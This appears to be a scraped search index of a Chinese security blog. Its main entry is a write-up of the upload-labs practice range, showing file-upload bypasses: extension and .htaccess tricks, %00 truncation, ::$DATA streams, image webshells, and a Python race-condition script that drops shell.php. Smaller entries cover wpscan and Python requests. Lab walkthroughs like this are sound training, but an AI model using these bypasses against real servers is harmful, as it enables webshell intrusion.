_eye=2 # protect 隐藏 但是可print(dog._eye)访问.修改 __leg=4 # 彻底保护. 万一访问的话,可以以下在外面访问(先定义一个方法): def getLeg(self): #获取私有属性 return self.__leg leg = dog.getLeg() print(leg) #可通过此方法在类外面查看 ###如果是修改私有属性的话: def setLeg(self,leg): #设置 self.__leg = leg dog.setLeg(55) #修改私有属性 print(dog.getLeg()) #用get 方法来查看一下 ","date":"2020-02-19","objectID":"/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%B0%8F%E4%BE%8B%E5%AD%90/:0:0","tags":["Python","面向对象"],"title":"python面向对象小例子","uri":"/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%B0%8F%E4%BE%8B%E5%AD%90/"},{"categories":["渗透测试"],"content":" https://blog.csdn.net/zhang644720213/article/details/92849717 参考自：https://blog.csdn.net/zhang644720213/article/details/92849717 先更新一下系统的索引 updatedb 查看文件 dpkg -L wpscan 下载需要的包（感谢大佬提供）: wget https://files.cnblogs.com/files/despotic/wp.zip 放到本地apache的目录下： mv wp.zip /var/www/html/wpscan/ 解压： unzip wp.zip 重启apache /etc/init.d/apache2 restart 编辑配置文件： vim /var/lib/gems/2.5.0/gems/wpscan-3.5.4/lib/wpscan/db/updater.rb 找到：def remote_file_url这个函数， 下面的服务器地址改为本地的目录http://127.0.0.1/wpsaca/#{filename} 再运行wpscan --upgrade就可以了 ","date":"2020-02-17","objectID":"/wpscan%E6%9B%B4%E6%96%B0%E8%B6%85%E6%97%B6%E6%8A%A5%E9%94%99/:0:0","tags":["渗透测试","WPscan"],"title":"wpscan更新超时报错","uri":"/wpscan%E6%9B%B4%E6%96%B0%E8%B6%85%E6%97%B6%E6%8A%A5%E9%94%99/"},{"categories":["渗透测试"],"content":"本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/upload-labs/ ps： - 为了快速验证效果，此处上传的webshell代码为\u003cphp? phpinfo(); ?\u003e - 解题思路五花八门，我这里想起了啥就用啥。 - 因为比较菜，所以做题直接看代码了就(谁料有的题目看了代码都看不懂)，哈哈哈。 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:0:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"相关函数 trim() 去除空格 strrchr()查找字符串在另一个字符串中`最后一次`出现的位置，并返回从该位置到字符串结尾的所有字符。 strrchr(\"被查找的字符串\", \"出现的字符串\") strstr() - 查找字符串的首次出现 strrpos() - 计算指定字符串在目标字符串中最后一次出现的位置 str_ireplace('要替换的对象','替换为','字符串') deldot($file_name);//删除文件名末尾的点 ::$DATA ---\u003e win上，会把`::$DATA`之后的数据当成文件流处理，不会检测后缀名，而且保持`::$DATA`之前的文件名（目的是不检查后缀名） pathinfo(path,options)返回一个关联数组包含有 path 的信息。 包括以下的数组元素： [dirname] [basename] [extension] 第二个参数可能的值： PATHINFO_DIRNAME - 只返回 dirname PATHINFO_BASENAME - 只返回 basename PATHINFO_EXTENSION - 只返回 extension 注释：如果不是要求取得所有单元，则 pathinfo() 函数返回字符串。 intval() 函数用于获取变量的整数值。 @uppack `rename()` 函数 ：重命名文件或目录。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。rename(oldname,newname,context) ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:1:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-01 js验证 点击上传文件之后，burp没有拦截到数据包，并且验证反应速度快 F12查看代码后确认 绕过 **F1: ** 禁用js，直接上传php 成功： F2： 在本地创建html，action为服务器请求地址，（去掉相应js部分） F3: 先把shell改为允许的类型,再bup中再改回来 效果都是一样的 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:2:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-02 服务端验证 – 文件MIME类型 只检测文件自带的类型 绕过： burp修改数据包中修改MIME类型（Content-Type）为允许的类型 Pass03-Pass10: 黑名单校验 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:3:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-03 服务端验证(黑名单方式) – 多种格式后缀解析 对上传的文件先过滤，后判断文件后缀，再随机命名 比如： a.php 先删掉文件名前后的空格 删除末尾的点： a.php strrchr之后： .php 转换为小写： .php 去除字符串::$DATA 再收尾去空格 最后加上日期重命名 绕过 前提: httpd-conf文件中AddType application/x-httpd-php 没有被注释，而且有规定类型的文件 对 phtml，php3，php4，php5，pht，htaccess没有进行过滤，那么利用这两种方法进行绕过。 补充: asp: asa, cer, cdx 等 jsp: jspx, jspf aspx: ashx,asmx,ascx 准备工作： 修改httpd-conf配置文件,这里可以把php3等想要的文件后缀加上，再把注释符#去掉 此类的正则表达式，文件名字满足即可在apache当做php解析。比如以下格式的文件： php3，php4, php5, phtml，phps 修改为： AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .phps F1: 修改后缀名 burp拦截数据包，修改filename为php3,上传成功 右键图片查看地址, 从这里可以得知上传的文件被重命名了, 打开图片地址，OK F2: 上传图片马 上传图片马，然后利用BP拦截，将后缀名 改为phtml,php3,php4,php5,pht ​ ​ ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:4:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-04 服务端（php5之类的也进行了过滤） 但是没有过滤.htaccess，可以考虑重写文件解析规则绕过 info.php.jpg. 绕过 前提: apache搭建， 没有对上传文件重命名 .htaccess文件 1.先上传一个.htaccess文件，内容如下： \u003cFilesMatch \"jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e 2.然后再上传一个info.php, burp拦截数据包修改filename为info.jpg / 或者直接上图片马， url访问图片路径，正常解析 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:5:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-05 连.htaccess都放黑名单了 缺陷： strrchr函数： 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符 如果有多个，匹配的是最后一个（这里并没有进行递归检测，前面的就会漏掉） 如果是a.php. jpg. 是不能正常解析的，但是a.php. .就行 绕过： 多写一个空格和点：上传文件 info.php， burp修改file为info.php. . 比如： a.php. . 去空：a.php. . 删除末尾点：a.php. 最后一个点被deldot删除 返回最后一个点的内容. 第二个strrchr匹配了第一个点和后面的空格 前后去空：后缀为., 不在黑名单范围，成功绕过 最后上传文件名为：a.php., 在windows保存文件的之后的.会消失 如下图，win服务器保存的文件： 正常解析： ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:6:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-06 没有进行后缀名大小写转换 绕过 burp修改filename后缀名为.phP，绕过检测，上传OK 正常解析 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:7:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-07 最后没有将后缀首尾去空 可以利用win文件名字保存格式的特性: 比如最后一个为空格info.php , .php 不在黑名单.php等中，成功绕过， 并且windows保存的时候会把最后的空格去除 绕过 burp修改filename为info.php ，后面加一个空格，上传 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:8:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-08 少了提前删除文件名末尾的点 的功能(deldot)； strrchr过滤匹配的是最后一个点； 没有对上传的文件重命名 绕过: F1： 后缀名加点绕过 burp修改文件名， a.php. a.php. 可以带空格 上传。 F2：利用Windows解析漏洞（后缀修改为1.php:1.jpg） 1.php:1.jpg 没成功： 上传的是1.php，但是文件内容是空的了 ​ ​ ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:9:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-09 Windows文件流绕过 少了 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA –\u003e 含义：把后缀中是 ::DATA替换为空 str_ireplace('要替换的对象','替换为','字符串')函数 由上可知，文件没有对后缀名进行去”::DATA”处理。 php在window的时候如果文件名+\"::DATA”处理。php在window的时候如果文件名+\"::DATA”处理。php在window的时候如果文件名+\"::DATA\"会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::DATA\"之前的文件名 他的目的就是不检查后缀名。 ps:只能是Windows系统，并且只能时php文件 绕过 info.php::$DATA 1.如图 ，在BP中修改图片马的 jpg 的后缀名，将其改为 php ，并且在后面加上 ::$DATA ; 2.在网页上检查图片马的执行情况时，将图片马的后缀名中 ::$DATA ，删去，便可浏览。 如图，这个是没有去掉后缀时，会发生报错。（因为我们实际上传的是PHP文件，即upload文件夹中只有php文件，而不存在带有后缀 ::$DATA的文件） Pass 10 - 11 （将filename拼接路径会带来极大风险） ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:10:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-10 绕过 构造后缀名点空绕过 strrchr函数 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符 如果有多个，匹配的是最后一个（前面的就会漏掉 由上可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，构造后缀名为php+点+空+点 burp修改文件名info.php. . ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:11:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass-11 双写绕过 没有strrchr str_ireplace函数： str_ireplace('要替换的对象','替换为','字符串'), 他把我们的php后缀替换为空 函数缺陷： 只是执行一次/或者没采用递归过滤 绕过 扰乱，删除里面后，外面还能组合成功后缀 burp修改filename=info.pphphp info.pphphp — \u003e ‘info.php’ Pass 12 - 13 将filename当做变量加入最终路径会带来极大风险 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:12:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 12 GET请求，URL网页上00截断 前提条件：php5.34以下， magic_quotes_gpc为off状态 魔术引号 magic_quotes_gpc 作用： 对（反斜杠？，单引号，双引号，none）产生影响, 自动加上/ 白名单绕过 ) save_path可控， $_GET['save_path'] 通过get获取，可以把get中url参数带上00截断 %00 截断（类似注释符号，后面的不再执行） Note： %00 是URL编码后的结果， 选中，解码转换（url decode）为小方块，才是真正的%00, Hex下是00 数据包中 save_path=../upload/shell.php%00 （注意 url_decode）后面的就没用了，filename=“shell.jpg” 由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 .jpg 截断，从而以 php 运行 绕过 URI中00截断 方法一：拦包00截断 由于是在get的url中，%00就不进行decode了， 上传成功： 查看图片路径： 查看服务器保存文件： 访问的时候，去掉后面的jpg，只访问php，OK： 方法二：前端直接修改为 “php+00截断\"格式 如下可得，直接将参数save_path修改为php+00截断的格式，因此它会将之后上传的所有文件以PHP的格式进行解析。 ps:图片是盗取的 burp只修改下面的filename为x.jpg即可 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:13:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 13 POST请求，00截断 白名单绕过 F1: 同12关，只是修改的地方不同 **1.**burp拦截。在post后面加上info.php%00 (%00是url decode之后的)，再发送即可 **2.**burp拦截，然后在上面的upload 的后面加上 123.php+（这里的123可以为任何名字，他只是一个代号。并且 php后面的 + 好也是一个标记，他的二进制代码为 2b） 由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 . 同样，访问的时候访问php文件： F2 意外发现：文件覆盖 由于名字可以不相同，即我们可以任意定义uploads旁边的 PHP 文件名，如果将文件名改为uploads中本身存在的文件，那么新的文件将会覆盖原来的文件。 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:14:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 20 （也是类似的，便于比较就放这里了） 这里进行过滤的是他的那个文件名，而不是我们上传文件最开始的文件名，所以要在他的文件名上做手脚 $file_ext = pathinfo($file_name,PATHINFO_EXTENSION) 返回拓展后缀 这里的文件名filename是可控的： $_POST['save_name'] 绕过 我们可以在save_path中加入php+00截断，由于是POST发送方式，因此我们需进行00截断。111.php%00upload-19.jpg （注意url decode） 上传OK： 去掉00后面内容，访问php，正常解析 Pass14 - 17 （文件包含漏洞） ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:15:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 14 获取文件头进行了验证 图片马制作： win下：copy a.jpg /b + b.php /a shell.jpg Linux下：cat a.jpg b.php \u003e shell.jpg 文件包含漏洞（xx.php?file=uploads/x.jpg） 文件不限格式后缀 意义：如果存在包含漏洞，需要上传一张图片(图片马)，就可以getshell $strInfo = @unpack(\"C2chars\", $bin);// C为无符号整数，网上搜到的都是c，为有符号整数，这样会产生负数判断不正常 $bin = fread($file, 2); //只读2字节进行验证 表示只是对文件头做了检测 $strInfo = @unpack(\"C2chars\", $bin); 标示前两个字符按照，c格式，数组索引chars1,chars2 @unpack $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); 文件头： 不同后缀类型文件头部代码中有GIF89a,NG,PK,7Z， 部分验证会验证文件头 常见文件头：https://blog.csdn.net/xiangshangbashaonian/article/details/80156865 突破： 伪造可行的文件头 绕过 上传图片马，上传。打开测试页面，引用刚才的图片马 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:16:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 15 getimagesize 函数拓展：getimagesize（） 判断是否为一个完整的图像 索引2$info[2] 是图像的类型 image_type_to_extension 获取的是MIME类型 $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); # 获取后缀jpeg , $info[2] 是文件类型 if(stripos($types,$ext)\u003e=0) # 是否在白名单中 绕过 上传图片马， 打开测试页面，直接包含includefile=‘文件.jpg’, 就是当成php解析 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:17:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 16 php_exif模块 函数拓展：exif_imagetype（） php_exif模块来判断文件类型 版本：PHP\u003e=4.3.0, PHP5, PHP7 绕过 需要开启php_exif模块： 1.打开配置文件，php拓展，php_exif打开； 2.配置文件在php.ini,分号是注释，可以直接解除注释启用,并将此行移动到extension=php_exif.dll之前，使之首先加载*。 上传图片马（注意MIME与后缀和文件头要一直，然后打开测试页面，包含gif，OK ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:18:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 17 （图片二次编码） 其实就是检测两次 本质： 检测 MIME和后缀是否对应 原理： 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。 具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); 绕过 好了，还是太菜，还是看大佬的解决方案学习学习把吧:点击这里 1.GIF 关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了. 2.PNG png的二次渲染的绕过并不能像gif那样简单. 3.JPG ps: 这一关是二次渲染的，还是多学习学习吧 18 -19 条件竞争 （多线程发包） ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:19:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 18 unlink函数： 数删除文件。若成功，则返回 true，失败则返回 false 执行步骤： 1.取出上传文件的后缀名 2.临时文件移动（move_uploaded_file）到一个路径下面， 3.如果后缀名在白名单，进行最后移动，保存 4.如果后缀名不在白名单，unlink删除临时文件 绕过 趁他不注意（多线程），在临时文件里面写一个创建后门文件的功能，这样虽然临时文件不满足被删除，但是自己自动创建的文件已经存在服务器目录了 F1： 其中，诱饵上传文件代码 \u003c?php $myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\"); $txt = \"\u003c?php phpinfo(); ?\u003e\\n\"; fwrite($myfile, $txt); fclose($myfile); ?\u003e 然后，如果已知新建文件的路径，可以直接访问 ​ 如果不知道，可以抓取数据包查看 方法： 1.利用burp的Intruder使用多线程发包(如下图)， 2.然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 webshell，新文件也会创建成功 ) F2: Python \\#!/usr/bin/env python3 \\# coding:utf-8 import hackhttp from multiprocessing.dummy import Pool as ThreadPool def upload(lists): ​ hh = hackhttp.hackhttp() ​ raw = \"\"\"POST /upload-labs/Pass-17/index.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/upload-labs/Pass-18/index.php Cookie: pass=18 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=---------------------------6696274297634 Content-Length: 341 -----------------------------6696274297634 Content-Disposition: form-data; name=\"upload_file\"; filename=\"18.php\" Content-Type: application/octet-stream \u003c?php $myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\"); $txt = \"\u003c?php phpinfo(); ?\u003e\\n\"; fwrite($myfile, $txt); fclose($myfile); ?\u003e -----------------------------6696274297634 Content-Disposition: form-data; name=\"submit\" 上传 -----------------------------6696274297634-- \"\"\" ​ code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw) ​ print(str(code) + \"\\r\") pool = ThreadPool(10) pool.map(upload, range(10000)) pool.close() pool.join() 只是把burp换成了python，其他操作方法是一样的 修复问题 应该先判断文件类型，再移动 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:20:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 19 if( $this-\u003ecls_rename_file == 1 ){ //是否用$im_path成功给$upload_file重命名 和第18关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。 绕过 在这关是一个白名单，利用了appche的一个解析漏洞，它会将 “.php.7z 当作 .php来解析，而刚好 “ .php.7z ”又属于白名单， 所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “ .php.7z”的文件， 由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW 的文件夹下面，但是不影响，并且这次的文件上传后就不会被删掉，就会保存在 该文件夹下面，这样的话我们将可以稳定的访问到。 可以看到，burp进行多线程发包后，在浏览器一致访问上传文件的地址，一定会有那么一瞬间会访问到（这时，文件里新建webshell的代码执行了，新的后门建立成功了，我们就可以访问后门了） 00截断和move_uploaded_file（）函数 ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:21:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 20 pathinfo(）函数：以数组的形式返回关于文件路径的信息。 pathinfo(path,options) move_uploaded_file(A,B)函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。 绕过 方法一： %00截断 （前面已经写了） 111.php%00upload-19.jpg 其中，%00是url-decode之后的 方法二： 利用move_uploaded_file（）函数和黑名单结合存在的漏洞： move_uploaded_file（A,B）函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。 由于这里利用了黑名单，则move_uploaded_file（）函数在判断时只会判断是否为黑名单，如果不是，那么他将会直接将文件保存在指定目录下。所以在这里我们利用 /.(斜杠点)和 空格（空格）进行绕过。 （1） “/.”(斜杠点) ​ upload-19.php/. （2）“ ”（空格） ​ upload-19.php ​ （3）“ .”（空格） upload-19.php. upload-19.php. 点+空格 等等… 方法三： Windows冒号截断 upload-19.php:.jpg (我做的实验，php上传成功，但是内容清空了) ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:22:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":"Pass - 21 参考: https://blog.csdn.net/kekefen01/article/details/90346413 通过传递数组绕过。属于逻辑漏洞，没有考虑数组第二个元素不存在的情况。 绕过 使用多个数组 ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name=\"upload_file\"; filename=\"info.php\" Content-Type: image/jpeg \u003c?php phpinfo();?\u003e ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name=\"save_name[0]\" info.php/ ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name=\"save_name[2]\" jpg ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name=\"submit\" 上传 ------WebKitFormBoundaryDTdqZdRoon2GpWOE-- 最终文件名为“info.php/.” 因为move_uploaded_file底层会调用tsrm_realpath函数导致，递归删除文件名最后的/. 参考文章：https://blog.csdn.net/weixin_43901038/article/details/94890631 https://www.cnblogs.com/shellr00t/p/6426945.html https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/ ","date":"2020-02-17","objectID":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:23:0","tags":["渗透测试","文件上传"],"title":"upload-labs通关记录","uri":"/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Python"],"content":"Requests是基于urllib3来改写的，采用Apache2 Licensed 来源协议的HTTP库。 它比urllib更加方便，可以节约我们大量的工作，完全满足HTTP测试需求。 ","date":"2020-02-17","objectID":"/python%E4%B9%8Brequests%E5%BA%93/:0:0","tags":["Python","requests"],"title":"python之requests库","uri":"/python%E4%B9%8Brequests%E5%BA%93/"},{"categories":["Python"],"content":"安装 pip install requests ","date":"2020-02-17","objectID":"/python%E4%B9%8Brequests%E5%BA%93/:1:0","tags":["Python","requests"],"title":"python之requests库","uri":"/python%E4%B9%8Brequests%E5%BA%93/"},{"categories":["Python"],"content":"使用 测试网站：http://httpbin.org/ GET请求 import requests # 不带参数 r = requests.get('http://httpbin.org/get') print(r.text) # 携带参数 data = { 'name':'zhangsan', 'age':20, } r1 = requests.get('http://httpbin.org/get', params=data) r3.encoding = 'utf-8' # 设置编码 print(r1.text) #如果是中文或者有其他特殊符号，则进行url编码 from urllib.parse import urlencode job = \"程序员\" parm = urlencode(job, encoding=\"utf-8\") # 再进行拼接后进行后续请求... POST请求 import requests # 不带参数 r = requests.post('http://httpbin.org/post') print(r.text) # 携带参数 data = { 'user': 1, 'pwd': 'hhh', 'submit': 'submit', } r1 = requests.post('http://httpbin.org/post', data=data) 请求头 # 自定义请求头 headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36', } response1 = requests.get(url, headers=headers,params=data) # 打印请求头 print(response1.request.headers) # 两种遍历方式 for key, value in r3.headers.items(): print(key+\":\"+value) print(\"************************************\") for key in r3.headers: # 不是请求头 print(key + \":\" + (r3.headers)[key]) 响应信息 # 响应头 print(response1.headers) # 其他信息 print(response1.headers['Server']) print(response1.url) # 打印url print(response1.status_code) # 状态码 200 print(response1.cookies.items()) # cookie print(response1.apparent_encoding) # 提供的编码 print(response1.elapsed) # 请求到响应的时间 print(r.history) # history属性得到请求历史 # cookie操作 print(response1.headers['Set-Cookie']) print(response.text) # 响应返回的数据: str print(response.content) # 响应返回的数据: 二进制形式 # 对文件内容查找(比如被安全狗拦截后页面中会有关键字:`safedog`) ... if response.text.find('safedor'): print('被拦截') else: print('绕过') ... # 比如爬图片，音乐，视频就是用的二进制数据 import requests response = requests.get('http://xpshuai.cn/favicon.ico') # 保存图片 wb写入 with open('favicon.ico','wb')as f: f.write(response.content) 解析json 使用json（）方法，就可以将返回结果是JSON格式的字符串转化为字典 import requests r = requests.get('http://httpbin.org/get') print(r.text) print(type(r.text)) # \u003cclass 'str'\u003e print(r.json()) print(type(r.json())) # \u003cclass 'dict'\u003e SSL证书检验 # 参数 verify=False时表示，对于 https 不验证证书 r = requests.get(url1, verify=False) 设置代理 import requests proxies = {'http': ' http://127.0.0.1:8080', 'https': ' https://127.0.0.1:8080'} r = requests.get(url, proxies=proxies, verify=False) 可以设置代理池, 随机更换 proxies = [] request = requests.get(url, proxies={'http': random.choice(proxies)}, headers=head) 自定义cookie #打印cookie for key,value in r.cookies.items(): print(key + '=' + value) 1.简单的做法: import requests headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/\" \"537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\" } cookies = {\"cookie_name\": \"cookie_value\", } response = requests.get(url, headers=headers, cookies=cookies) 2.CookieJar 更专业的方式:先实例化一个RequestCookieJar的类，然后把值set进去，最后在get,post方法里面指定cookies参数 from http.cookiejar import CookieJar requests.cookies.update() c = requests.cookies.RequestsCookieJar() c.set('cookie-name', 'cookie-value', path='/', domain='.abc.com') s.cookies.update(c) 3.requests.Session()方法 session = requests.Session() session.cookies['cookie'] = 'cookie-value' # 功能：可以添加cookie，不会清除原cookie # 缺点：不能设置path，domain等参数 session 会话维持 